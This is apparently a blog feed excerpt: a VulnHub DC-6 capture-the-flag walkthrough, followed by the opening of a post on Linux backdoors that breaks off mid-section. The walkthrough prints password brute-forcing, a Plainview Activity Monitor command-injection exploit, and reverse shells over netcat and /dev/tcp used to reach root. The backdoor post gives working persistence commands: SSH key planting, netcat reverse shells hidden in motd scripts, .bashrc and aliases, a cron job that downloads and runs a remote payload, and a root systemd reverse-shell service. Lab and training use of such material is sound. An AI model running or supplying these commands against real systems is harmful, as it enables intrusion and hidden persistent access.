<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «dc-6» «192.168.43.234» 
$ arp-scan --interface eth0 <span style="color:#e6db74">&#39;192.168.2.0/24&#39;</span> | tee scans/00-arp-scan-dc6
Interface: eth0, type: EN10MB, MAC: 08:00:27:0b:94:f0, IPv4: 192.168.2.103
Starting arp-scan 1.9.7 with <span style="color:#ae81ff">256</span> hosts <span style="color:#f92672">(</span>https://github.com/royhills/arp-scan<span style="color:#f92672">)</span>
192.168.2.1     08:00:27:e8:e9:78       PCS Systemtechnik GmbH
192.168.2.2     0a:00:27:00:00:07       <span style="color:#f92672">(</span>Unknown: locally administered<span style="color:#f92672">)</span>
192.168.2.104   08:00:27:ac:db:5f       PCS Systemtechnik GmbH
</code></pre></div><h3 id="nmap">Nmap</h3>
<p>With initial scan, <code>nmap</code> shows two ports open: SSH on port 22 and Apache Web Server on port 80.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «dc-6» «192.168.43.234» 
$ nmap -n -sC -sV -oA scans/10-initial-dc6 <span style="color:#e6db74">&#39;192.168.2.104&#39;</span> -v
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey: 
|   <span style="color:#ae81ff">2048</span> 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
|   <span style="color:#ae81ff">256</span> 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
|_  <span style="color:#ae81ff">256</span> 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
80/tcp open  http    Apache httpd 2.4.25 <span style="color:#f92672">((</span>Debian<span style="color:#f92672">))</span>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
|_http-title: Did not follow redirect to http://wordy/
|_https-redirect: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
MAC Address: 08:00:27:AC:DB:5F <span style="color:#f92672">(</span>Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span style="color:#75715e"># Nmap done at Sat Apr 10 01:42:04 2021 -- 1 IP address (1 host up) scanned in 15.00 second</span>
</code></pre></div><p>From the results above, there&rsquo;s a redirection to <code>http://wordy/</code> on port 80. To properly resolve the web, I&rsquo;ll add wordy to my <code>/etc/hosts</code> file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">192.168.1.104   wordy
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>This page clearly states that it&rsquo;s a WordPress site.</p>
<p><div class="img-container"><img src="imgs/image-20210419191210177.png" alt="image-20210419191210177"  /></div>
</p>
<p>Nothing interesting to explore, but the text <code>secure plugins</code> seems to be a hint from the machine&rsquo;s author.</p>
<p>I ran a <code>gobuster</code> scan but found nothing useful.</p>
<h4 id="nmap-nse">Nmap NSE</h4>
<p><code>nmap</code> script scan found some usernames.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «dc-6» «192.168.43.234» 
$ nmap -p <span style="color:#ae81ff">80</span> --script <span style="color:#e6db74">&#34;http-wordpress*&#34;</span> wordy
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-04-11 23:13 EDT
Nmap scan report <span style="color:#66d9ef">for</span> wordy <span style="color:#f92672">(</span>192.168.2.104<span style="color:#f92672">)</span>
Host is up <span style="color:#f92672">(</span>0.00069s latency<span style="color:#f92672">)</span>.

PORT   STATE SERVICE
80/tcp open  http
...
|   /: WordPress version: 5.1.1
...
| http-wordpress-users: 
| Username found: admin
| Username found: graham
| Username found: mark
| Username found: sarah
| Username found: jens
|_Search stopped at ID <span style="color:#75715e">#25. Increase the upper limit if necessary with &#39;http-wordpress-users.limit&#39;</span>
MAC Address: 08:00:27:AC:DB:5F <span style="color:#f92672">(</span>Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>

Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 22.48 seconds
</code></pre></div><h4 id="wpscan">WPScan</h4>
<p><code>wpscan</code> identifies two vulnerable WP plugins: an RCE and a user role privilege escalation.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «dc-6» «192.168.43.234» 
$ wpscan --url http://wordy/ --enumerate vp --api-token token123 --plugins-detection aggressive
...
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> plainview-activity-monitor
 | Location: http://wordy/wp-content/plugins/plainview-activity-monitor/
 | Last Updated: 2018-08-26T15:08:00.000Z
 | Readme: http://wordy/wp-content/plugins/plainview-activity-monitor/readme.txt
 | <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> The version is out of date, the latest version is <span style="color:#ae81ff">20180826</span>
 | <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Directory listing is enabled
 |
 | Found By: Known Locations <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
 |  - http://wordy/wp-content/plugins/plainview-activity-monitor/, status: <span style="color:#ae81ff">200</span>
 |
 | <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> <span style="color:#ae81ff">1</span> vulnerability identified:
 |
 | <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Title: Plainview Activity Monitor &lt;<span style="color:#f92672">=</span> <span style="color:#ae81ff">20161228</span> - Remote Command Execution <span style="color:#f92672">(</span>RCE<span style="color:#f92672">)</span>
 |     Fixed in: <span style="color:#ae81ff">20180826</span>
 |     References:
 |      - https://wpscan.com/vulnerability/ab749b6c-c405-40e0-8417-0fe1bdb8537c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style="color:#f92672">=</span>CVE-2018-15877
 |      - https://plugins.trac.wordpress.org/changeset/1930493/plainview-activity-monitor
 |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_plainview_activity_monitor_rce/
 |
 | Version: <span style="color:#ae81ff">20161228</span> <span style="color:#f92672">(</span>50% confidence<span style="color:#f92672">)</span>
 | Found By: Readme - ChangeLog Section <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
 |  - http://wordy/wp-content/plugins/plainview-activity-monitor/readme.txt

<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> user-role-editor
 | Location: http://wordy/wp-content/plugins/user-role-editor/
 | Last Updated: 2021-04-05T02:38:00.000Z
 | Readme: http://wordy/wp-content/plugins/user-role-editor/readme.txt
 | <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> The version is out of date, the latest version is 4.59
 |
 | Found By: Known Locations <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
 |  - http://wordy/wp-content/plugins/user-role-editor/, status: <span style="color:#ae81ff">200</span>
 |
 | <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> <span style="color:#ae81ff">1</span> vulnerability identified:
 |
 | <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Title: User Role Editor &lt;<span style="color:#f92672">=</span> 4.24 - Privilege Escalation
 |     Fixed in: 4.25
 |     References:
 |      - https://wpscan.com/vulnerability/85e595f5-9f04-4799-9a09-c6675071b12c
 |      - https://www.wordfence.com/blog/2016/04/user-role-editor-vulnerability/
 |
 | Version: 4.24 <span style="color:#f92672">(</span>80% confidence<span style="color:#f92672">)</span>
 | Found By: Readme - Stable Tag <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
 |  - http://wordy/wp-content/plugins/user-role-editor/readme.txt
...
</code></pre></div><p>I&rsquo;m interested with the RCE one, but before that I&rsquo;ll have to find creds.</p>
<h4 id="brute-forcing-passwords">Brute-forcing passwords</h4>
<p>At that time, I was stuck for a couple of hours. Asking for a nudge and the answer was to brute force, I didn&rsquo;t know that the box&rsquo;s author actually gave us a hint to create a custom wordlist from <code>rokyou.txt</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210419183629054.png" alt="image-20210419183629054"  /></div>
</p>
<p>I&rsquo;ll create new wordlist from <code>rockyou.txt</code> and then use it to perform a brute force using <code>wpscan</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «dc-6» «192.168.43.234» 
$ cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt
→ root@iamf «dc-6» «192.168.43.234» 
$ wpscan --url http://wordy/ --usernames users --passwords passwords.txt 
</code></pre></div><p>It returns one valid credentials: <code>mark:helpdesk10</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210419184715108.png" alt="image-20210419184715108"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="wp-dashboard">WP Dashboard</h4>
<p>With the credentials I obtained, I can login into the admin panel.</p>
<p><div class="img-container"><img src="imgs/image-20210531002724008.png" alt="image-20210531002724008"  /></div>
</p>
<h4 id="plainview-activity-monitor---rce--cve-2018-15877">Plainview Activity Monitor - RCE  (CVE-2018-15877)</h4>
<p>From the previous <code>wpscan</code>, I searched the exploit PoC for Plainview Activity Monitor RCE and found this from <a href="https://www.exploit-db.com/exploits/45274">exploit-db</a>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">html</span>&gt;
  <span style="color:#75715e">&lt;!--  Wordpress Plainview Activity Monitor RCE
</span><span style="color:#75715e">        [+] Version: 20161228 and possibly prior
</span><span style="color:#75715e">        [+] Description: Combine OS Commanding and CSRF to get reverse shell
</span><span style="color:#75715e">        [+] Author: LydA(c)ric LEFEBVRE
</span><span style="color:#75715e">        [+] CVE-ID: CVE-2018-15877
</span><span style="color:#75715e">        [+] Usage: Replace 127.0.0.1 &amp; 9999 with you ip and port to get reverse shell
</span><span style="color:#75715e">        [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well
</span><span style="color:#75715e">  --&gt;</span>
  &lt;<span style="color:#f92672">body</span>&gt;
  &lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">history</span>.<span style="color:#a6e22e">pushState</span>(<span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;/&#39;</span>)&lt;/<span style="color:#f92672">script</span>&gt;
    &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span> <span style="color:#a6e22e">enctype</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;multipart/form-data&#34;</span>&gt;
      &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ip&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;google.fr| nc -nlvp 127.0.0.1 9999 -e /bin/bash&#34;</span> /&gt;
      &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;lookup&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Lookup&#34;</span> /&gt;
      &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Submit request&#34;</span> /&gt;
    &lt;/<span style="color:#f92672">form</span>&gt;
  &lt;/<span style="color:#f92672">body</span>&gt;
&lt;/<span style="color:#f92672">html</span>&gt;
</code></pre></div><p>The vulnerability comes from this IP tools feature.</p>
<p><div class="img-container"><img src="imgs/image-20210419194814055.png" alt="image-20210419194814055"  /></div>
</p>
<p>I&rsquo;ll hit the lookup button and intercept the request on Burp.</p>
<p>RCE can be achieved by adding a set of malicious OS commands after the command pipe <code>|</code>, semi colon <code>;</code> (stacked command), or logical OR <code>||</code> at the <code>ip</code> section. In this case, I send a reverse shell.</p>
<p>Here is with command pipe.</p>
<p><div class="img-container"><img src="imgs/image-20210419194314291.png" alt="image-20210419194314291"  /></div>
</p>
<p>And this one by stacking commands with semicolon.</p>
<p><div class="img-container"><img src="imgs/image-20210419200042885.png" alt="image-20210419200042885"  /></div>
</p>
<p>I can not find the plugin&rsquo;s source code, my best guess it can be something like this.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">...</span>
$ip <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;ip&#39;</span>]
$do_something <span style="color:#f92672">=</span> <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;dig </span><span style="color:#e6db74">$ip</span><span style="color:#e6db74">&#34;</span>)
<span style="color:#f92672">...</span>
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-graham">Shell as graham</h3>
<h4 id="internal-enumeration">Internal enumeration</h4>
<p>The home directory is readable by <code>www-data</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@dc-6:/var/www/html/wp-admin$ find /home 2&gt;/dev/null
find /home 2&gt;/dev/null
...
/home/jens/backups.sh
....
/home/mark/stuff/things-to-do.txt
....
</code></pre></div><p>I immediately checked the contents of <code>backups.sh</code> and <code>things-to-do.txt</code>.</p>
<p>The <code>backups.sh</code> script is writable by group <code>devs</code>, and I&rsquo;ll note that.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@dc-6:/var/www/html/wp-admin$ ls -l /home/jens/backups.sh
ls -l /home/jens/backups.sh
-rwxrwxr-x <span style="color:#ae81ff">1</span> jens devs <span style="color:#ae81ff">50</span> Apr <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2019</span> /home/jens/backups.sh
www-data@dc-6:/var/www/html/wp-admin$ cat /home/jens/backups.sh
cat /home/jens/backups.sh
<span style="color:#75715e">#!/bin/bash</span>
tar -czf backups.tar.gz /var/www/html
</code></pre></div><p>And this <code>things-to-do.txt</code> contains graham&rsquo;s credentials.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">www-data@dc-6:/var/www/html/wp-admin$ cat /home/mark/stuff/things-to-do.txt
cat /home/mark/stuff/things-to-do.txt
Things to do:

- Restore full functionality for the hyperdrive (need to speak to Jens)
- Buy present for Sarah&#39;s farewell party
- Add new user: graham - GSo7isUM1D4 - done
- Apply for the OSCP course
- Buy new laptop for Sarah&#39;s replacement
</code></pre></div><h4 id="ssh---graham">SSH - graham</h4>
<p>I tried the graham&rsquo;s creds, <code>graham:GSo7isUM1D4</code>, on SSH, and it worked.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@iamf «dc-6» «192.168.43.234» 
$ ssh graham@192.168.2.104
graham@192.168.2.104&#39;s password: 
Linux dc-6 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
graham@dc-6:~$ id
uid=1001(graham) gid=1001(graham) groups=1001(graham),1005(devs)
</code></pre></div><h3 id="shell-as-jens">Shell as jens</h3>
<h4 id="sudo-privileges---backupssh">Sudo privileges - backups.sh</h4>
<p>User <code>graham</code> has sudo privileges on the <code>backups.sh</code> script, and this allows me to run the script as user <code>jens</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">graham@dc-6:~$ sudo -l
Matching Defaults entries for graham on dc-6:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User graham may run the following commands on dc-6:
    (jens) NOPASSWD: /home/jens/backups.sh
graham@dc-6:~$ cat /home/jens/backups.sh
#!/bin/bash
tar -czf backups.tar.gz /var/www/html
graham@dc-6:~$ ls -l /home/jens/backups.sh
-rwxrwxr-x 1 jens devs 50 Apr 26  2019 /home/jens/backups.sh
</code></pre></div><p>Because the script is also writable by graham (<code>devs</code> group), I can exploit this to escalate myself to <code>jens</code> by adding a reverse shell line to the script and then run it with sudo.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">graham@dc-6:~$ echo <span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/192.168.2.108/9000 0&gt;&amp;1&#39;</span> &gt;&gt; /home/jens/backups.sh
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210419204321872.png" alt="image-20210419204321872"  /></div>
</p>
<h3 id="shell-as--root">Shell as  root</h3>
<h4 id="sudo-privileges---nmap">Sudo privileges - nmap</h4>
<p>I found out that user <code>jens</code> is allowed to execute <code>nmap</code> as root user.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">jens@dc-6:/home/graham$ sudo -l
sudo -l
Matching Defaults entries <span style="color:#66d9ef">for</span> jens on dc-6:
    env_reset, mail_badpass,
    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin

User jens may run the following commands on dc-6:
    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/nmap
</code></pre></div><p>I&rsquo;ll also exploit this using reference from <a href="https://gtfobins.github.io/gtfobins/nmap/">GTFObins</a>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">jens@dc-6:/home/graham$ TF<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>mktemp<span style="color:#66d9ef">)</span>
jens@dc-6:/home/graham$ echo <span style="color:#e6db74">&#39;os.execute(&#34;/bin/sh&#34;)&#39;</span> &gt; $TF
jens@dc-6:/home/graham$ sudo nmap --script<span style="color:#f92672">=</span>$TF
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210419204616406.png" alt="image-20210419204616406"  /></div>
</p>
<p>And here is the flag.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@dc-6:~# cat theflag.txt 


Yb        dP 888888 88     88         8888b.   dP&#34;Yb  88b 88 888888 d8b 
 Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P 
  YbdPYbdP   88&#34;&#34;   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88&#34;&#34;   `&#34;&#39; 
   YP  YP    888888 88ood8 88ood8     8888Y&#34;   YbodP  88  Y8 888888 (8) 


Congratulations!!!

Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those
who have provided feedback, and who have taken time to complete these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.
</code></pre></div><hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://www.vulnhub.com/entry/dc-6,315/">https://www.vulnhub.com/entry/dc-6,315/</a></li>
<li><a href="https://gtfobins.github.io/gtfobins/nmap/">https://gtfobins.github.io/gtfobins/nmap/</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>Linux Backdoors and Where to Find Them</title>
      <link>https://fahmifj.github.io/blog/linux-backdoors-and-where-to-find-them/</link>
      <pubDate>Tue, 25 May 2021 18:49:35 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/linux-backdoors-and-where-to-find-them/</guid>
      <description>Learn some backdoor techniques and how to deal with them!</description>
      <content:encoded><![CDATA[<p>In Attack-Defense CTF, leaving backdoors is an important part of maintaining access on the target system. As a result, learning some of the backdoor techniques is essential, not only for attackers but also for defenders.</p>
<h2 id="backdoors-what-is-it">Backdoors, what is it?</h2>
<p>What exactly is a backdoor?</p>
<p>Well, I&rsquo;m not going to go into as much detail as <a href="https://en.wikipedia.org/wiki/Backdoor_(computing)">Wikipedia</a>, but here&rsquo;s:</p>
<p>A backdoor is a hidden piece of code, script, or a program that is placed on a system for persistence purposes, with that you don’t have to exploit the same system twice. It simply gives you quicker and instant access to the system.</p>
<p>Now that we know what a backdoor is, it’s time to find out where attackers typically hide them in a <strong>Linux</strong> system. I’ll be using the <a href="https://www.vulnhub.com/entry/pinkys-palace-v1,225/">Pinky’s Palace</a> machine from VulnHub and let’s pretend it has been compromised by attackers.</p>
<h3 id="1-ssh-keys">1. SSH keys</h3>
<p>When the attackers insert their public keys into one of the user&rsquo;s or root&rsquo;s <code>authorized_keys</code> file, it can be considered as a backdoor.</p>
<p>For example, below are the exploitation steps to gain root access on the target system (Pinky&rsquo;s Palace).</p>
<p><div class="img-container"><img src="imgs/image-20210526004056632.png" alt="image-20210526004056632"  /></div>
</p>
<p>Of course, as an attacker, I don’t want to repeat all those exploitation steps all over again.</p>
<p>So instead, on my attacking machine, I’ll generate a new pair of <a href="https://medium.com/risan/upgrade-your-ssh-key-to-ed25519-c6e8d60d3c54">SSH keys</a> specialized for backdoor.</p>
<p><div class="img-container"><img src="imgs/image-20210526004747293.png" alt="image-20210526004747293"  /></div>
</p>
<p>And then, I can insert the newly generated public key (<code>backdoor_ssh.pub</code>) into the root’s or user’s  <code>authorized_keys</code> file of the compromised system.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text"># echo &#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILaxTiK3WJJ422K1yf/9yXFWBeWV6mpZxMEualO2uIul root@kali&#39; &gt; /root/.ssh/authorized_keys
</code></pre></div><p>Now by specifying <code>backdoor_ssh</code> as the identity file (private key), I’m able to gain access on the compromised system via SSH instantly.</p>
<p><div class="img-container"><img src="imgs/image-20210526005156382.png" alt="image-20210526005156382"  /></div>
</p>
<h3 id="2-ssh-motd">2. SSH motd</h3>
<p>This is one of the cool tricks I&rsquo;ve learned from HackTheBox machine called Traceback.</p>
<p>Motd (Message of the day) is the banner that appears when you log into the machine using SSH. For Ubuntu/Debian motd can be found at <code>/etc/update-motd.d</code>.</p>
<p>By default, other users don&rsquo;t have write permission on that directory.</p>
<p><div class="img-container"><img src="imgs/image-20210526010220513.png" alt="image-20210526010220513"  /></div>
</p>
<p>From the image above, there is only one motd script called <code>10-uname</code>.</p>
<p>As an attacker, I could place a new script there as a backdoor. For example, I&rsquo;ll put a reverse shell script called <code>20-backdoor</code> using <strong>netcat</strong>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@pinkys-palace:/etc/update-motd.d# echo -e &#39;#!/bin/sh\nnc 192.168.2.103 9001 -e /bin/bash &amp;&#39; &gt; 20-backdoor &amp;&amp; chmod +x 20-backdoor
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210526010934360.png" alt="image-20210526010934360"  /></div>
</p>
<p>But wait, I logged in using pinky. How did I end up with a root shell?</p>
<p>Here is the <a href="http://manpages.ubuntu.com/manpages/xenial/en/man5/update-motd.5.htm">answer</a>:</p>
<blockquote>
<p>&hellip;</p>
<p>​       Executable scripts in /etc/update-motd.d/* are executed by pam_motd(8) as the root user at
​       each  login,  and  this information is concatenated in /var/run/motd.  The order of script
​       execution is determined by the run-parts(8) &ndash;lsbsysinit  option  (basically  alphabetical
​       order, with a few caveats).</p>
<p>&hellip;</p>
</blockquote>
<h3 id="3-users-bashrc---interactive-session">3. User&rsquo;s .bashrc - Interactive session</h3>
<p><code>.bashrc</code> is one of the startup scripts used by Bourne shell aka <code>bash</code>. If there is a user who uses <code>bash</code> as their login shell, then it gets executed for each interactive session they launch.</p>
<p>Here is some actions that triggers an interactive session:</p>
<p><div class="img-container"><img src="imgs/image-20210526005325944.png" alt="image-20210526005325944"  /></div>
</p>
<p>At the image above, I inserted a non malicious line script <code>echo &quot;I'm triggered&quot;</code> to my <code>.bashrc</code>. But now, as an attacker, I can put a reverse shell there and then I&rsquo;ll just wait for someone to log in to trigger it.</p>
<pre><code>pinky@pinkys-palace:~$ echo 'nc 192.168.2.103 9001 -e /bin/bash &gt;/dev/null &amp;' &gt; .bashrc
</code></pre><p><div class="img-container"><img src="imgs/image-20210525220025256.png" alt="image-20210525220025256"  /></div>
</p>
<p>In the image above, I switched from <code>root</code> to user <code>pinky</code> and put a reverse shell on pinky&rsquo;s <code>.bashrc</code> file. I exited pinky&rsquo;s shell and immediately switch again to user <code>pinky</code> to trigger an interactive session.</p>
<h3 id="4-users-bashrc---aliases">4. User&rsquo;s .bashrc - Aliases</h3>
<p>As an attacker, I can also put the backdoor in the users' aliases!</p>
<p>Here is the example of a backdoored <code>cd</code>.</p>
<pre><code>root@pinkys-palace:~# alias cdalias cd='$(nc 192.168.2.103 9001 -e /bin/bash&amp;); cd'
</code></pre><p><div class="img-container"><img src="imgs/image-20210526002305189.png" alt="image-20210526002305189"  /></div>
</p>
<p>Some other tricky backdoor using alias:</p>
<ul>
<li><a href="https://github.com/nisay759/sudo-backdoor">https://github.com/nisay759/sudo-backdoor</a></li>
<li><a href="https://gist.github.com/ahhh/1d4bf832c5a88cc75adb">https://gist.github.com/ahhh/1d4bf832c5a88cc75adb</a></li>
</ul>
<h3 id="5-cron-jobs">5. Cron jobs</h3>
<p>Cron is a feature from Linux/UNIX-like OS that can be used to periodically perform a specific job or task just like Task Scheduler in Windows.</p>
<p>Here is the example of a backdoor using Cron job.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@pinkys-palace:~# echo &#39;* * * * * root cd /tmp; wget 192.168.2.113/backdoor &amp;&amp; chmod +x backdoor &amp;&amp; ./backdoor; rm /etc/cron.d/backdoor&#39; &gt; /etc/cron.d/backdoor
</code></pre></div><p>What the task above does is it will download a backdoor that is hosted on my attacking machine, and the backdoor then gets executed every minute.</p>
<p><div class="img-container"><img src="imgs/image-20210525222500077.png" alt="image-20210525222500077"  /></div>
</p>
<h3 id="6-backdoor-as-a-service-baas">6. Backdoor as a Service (BaaS)</h3>
<p>An attacker can also create a backdoor as a service (BaaS) *I&rsquo;m joking, but it&rsquo;s true.</p>
<p>Here is the example of BaaS typed directly in a terminal:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@pinkys-palace:/etc/systemd/system# echo &#39;
&gt; [Service]
&gt; Type=simple
&gt; User=root
&gt; ExecStart=/bin/bash -c &#34;bash -i &gt;&amp; /dev/tcp/192.168.2.103/9001 0&gt;&amp;1&#34;
&gt; [Install]
&gt; WantedBy=multi-user.target&#39;
&gt; &#39; &gt; backdoor.service
</code></pre></div><p>In a single file (<code>backdoor.service</code>):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">[Service]
Type=simple
User=root
ExecStart=/bin/bash -c &#34;bash -i &gt;&amp; /dev/tcp/192.168.2.103/9001 0&gt;&amp;1&#34;
[Install]
